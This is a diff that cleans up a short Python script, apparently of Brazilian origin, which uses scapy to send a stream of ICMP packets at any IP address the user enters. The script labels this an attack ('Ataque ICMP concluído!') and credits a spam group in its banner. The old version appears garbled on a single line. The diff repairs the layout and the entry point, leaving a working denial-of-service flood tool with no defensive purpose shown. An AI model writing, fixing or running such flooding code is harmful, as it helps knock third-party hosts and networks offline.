@@ -1,26 +1,38 @@
-import os import sys import random import time from scapy.all import IP, ICMP, send
+import os
+import sys
+import random
+import time
+from scapy.all import IP, ICMP, send
 
-def icmp_flood(target_ip, port, packet_count): print(""" __________           .___
-______   \ ____   | /
-|       // __ \ / __ |
-|    |   \  // // |
-||  /__  >____ |
-/     /     /
-____   ____      .__   __   .__       .__
-\   \ /   /____  |  | |  | ||||___
-\   Y   /__  \ |  | |  |/ /  _  __ \  __  \
-\     /  / __ |  ||    <|  ||  | /  |/ __ _
-___/  (___  //__| _|||  |(__  / /          /                 / --------------------------------- | Make by Jhon | Equipe Família Spamer | --------------------------------- """)
+def icmp_flood(target_ip, packet_count):
+    print(r"""
+ __________           .___
+\______   \ ____   __| _/
+ |       _// __ \ / __ | 
+ |    |   \  ___// /_/ | 
+ |____|_  /\___  >____ | 
+        \/     \/     \/ 
+____   ____      .__   __   .__                
+\   \ /   /____  |  | |  | _|__|______   ____  
+ \   Y   /\__  \ |  | |  |/ /  \_  __ \_/ __ \ 
+  \     /  / __ \|  |_|    <|  ||  | \/\  ___/ 
+   \___/  (____  /____/__|_ \__||__|    \___  >
+               \/          \/               
 
-for _ in range(packet_count):
-    packet = IP(dst=target_ip)/ICMP()
-    send(packet, verbose=False)
-    print(f"[+] Pacote enviado para {target_ip}:{port}")
-    time.sleep(0.1)
+---------------------------------
+|  Make by Jhon                |
+---------------------------------
+    """)
+    for _ in range(packet_count):
+        packet = IP(dst=target_ip)/ICMP()
+        send(packet, verbose=False)
+        print(f"[+] Pacote enviado para {target_ip}")
+        time.sleep(0.1)
 
-print("[+] Ataque ICMP concluído!")
+    print("[+] Ataque ICMP concluído!")
 
-if name == "main": target_ip = input("IP do site: ") port = input("Porta do site: ") packet_count = int(input("Quantidade de packets: "))
+if __name__ == "__main__":
+    target_ip = input("IP do alvo: ")
+    packet_count = int(input("Quantidade de pacotes: "))
 
-icmp_flood(target_ip, port, packet_count)
-
+    icmp_flood(target_ip, packet_count)
